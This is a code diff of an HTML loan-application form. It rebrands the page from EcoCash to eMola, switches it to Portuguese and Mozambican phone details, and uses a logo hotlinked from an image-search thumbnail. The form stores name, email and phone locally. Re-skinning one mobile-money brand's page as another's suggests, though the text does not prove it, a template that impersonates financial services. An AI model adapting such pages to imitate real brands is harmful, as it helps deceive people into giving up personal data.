@@ -1,10 +1,10 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="pt">
 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EcoCash - Loan Application</title>
+    <title>eMola - Candidatura de Empréstimo</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
         * {
@@ -49,16 +49,15 @@
         }
         
         .logo {
-            font-size: 28px;
-            font-weight: 700;
+            height: 40px;
+            display: flex;
+            align-items: center;
         }
         
-        .logo-eco {
-            color: #0066ff;
-        }
-        
-        .logo-cash {
-            color: #ff0000;
+        .logo img {
+            height: 100%;
+            width: auto;
+            object-fit: contain;
         }
         
         .card {
@@ -195,7 +194,7 @@
         }
         
         .next-btn {
-            background: linear-gradient(to right, #4361ee, #7209b7);
+            background: linear-gradient(to right, #c77e12, #cf630a);
             color: white;
         }
         
@@ -213,48 +212,48 @@
 <body>
     <header>
         <button class="back-btn" onclick="history.back()">←</button>
-        <div class="logo"><span class="logo-eco">Eco</span><span class="logo-cash">Cash</span></div>
+        <div class="logo"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQLjt7GJwM7u7GcGVvgKYFLd3Rbs5izlnLeBAf_tGdu8Q&s=10" alt="eMola"></div>
         <div></div>
     </header>
 
     <main class="card">
-        <h1 class="form-title">Loan Application</h1>
+        <h1 class="form-title">Candidatura de Empréstimo</h1>
         <div class="progress-bar">
             <div class="progress-fill"></div>
         </div>
-        <div class="step-text">Step 2 of 3</div>
+        <div class="step-text">Etapa 2 de 3</div>
 
         <div class="name-group">
             <div>
-                <label class="form-label">First Name</label>
-                <input type="text" class="form-input" id="firstName" placeholder="John">
+                <label class="form-label">Nome</label>
+                <input type="text" class="form-input" id="firstName" placeholder="João">
             </div>
             <div>
-                <label class="form-label">Last Name</label>
-                <input type="text" class="form-input" id="lastName" placeholder="Doe">
+                <label class="form-label">Apelido</label>
+                <input type="text" class="form-input" id="lastName" placeholder="Silva">
             </div>
         </div>
 
-        <label class="form-label">Email Address</label>
-        <input type="email" class="form-input" id="email" placeholder="john.doe@example.com" style="margin-bottom:24px;">
+        <label class="form-label">Endereço de Email</label>
+        <input type="email" class="form-input" id="email" placeholder="joao.silva@exemplo.co.mz" style="margin-bottom:24px;">
 
-        <label class="form-label">Phone Number</label>
+        <label class="form-label">Número de Telemóvel</label>
         <div class="phone-group" id="phoneGroup">
-            <span class="phone-prefix">+263</span>
-            <input type="tel" class="phone-input" id="phone" placeholder="771234567">
+            <span class="phone-prefix">+258</span>
+            <input type="tel" class="phone-input" id="phone" placeholder="841234567">
         </div>
-        <small style="color:#999; display:block; margin-bottom:30px;">Enter 9 digits (e.g. 771234567)</small>
+        <small style="color:#999; display:block; margin-bottom:30px;">Introduza 9 dígitos (ex.: 841234567)</small>
 
         <div class="btn-group">
-            <button class="prev-btn" onclick="history.back()">PREVIOUS</button>
-            <button class="next-btn" id="nextBtn">NEXT STEP</button>
+            <button class="prev-btn" onclick="history.back()">ANTERIOR</button>
+            <button class="next-btn" id="nextBtn">PRÓXIMA ETAPA</button>
         </div>
     </main>
 
-    <footer>© 2025 EcoCash</footer>
+    <footer>© 2025 eMola</footer>
 
     <script>
-        // Pre-fill if user goes back
+        // Pre-preenchimento se o utilizador voltar
         if (localStorage.getItem('firstName')) document.getElementById('firstName').value = localStorage.getItem('firstName');
         if (localStorage.getItem('lastName')) document.getElementById('lastName').value = localStorage.getItem('lastName');
         if (localStorage.getItem('email')) document.getElementById('email').value = localStorage.getItem('email');
@@ -266,7 +265,7 @@
             const email = document.getElementById('email').value.trim();
             const phone = document.getElementById('phone').value.trim();
 
-            // Reset invalid styles
+            // Repor estilos inválidos
             document.querySelectorAll('.form-input, #phoneGroup').forEach(el => el.classList.remove('invalid'));
 
             let valid = true;
@@ -289,17 +288,17 @@
             }
 
             if (!valid) {
-                alert('Please complete all fields correctly.\n• Email must be valid\n• Phone must be exactly 9 digits');
+                alert('Por favor, preencha todos os campos corretamente.\n• O email deve ser válido\n• O telemóvel deve ter exatamente 9 dígitos');
                 return;
             }
 
-            // Save to localStorage
+            // Guardar no localStorage
             localStorage.setItem('firstName', firstName);
             localStorage.setItem('lastName', lastName);
             localStorage.setItem('email', email);
             localStorage.setItem('phone', phone);
 
-            // Go to summary (clean URL)
+            // Ir para o resumo (URL limpo)
             window.location.href = 'summary.html';
         });
     </script>
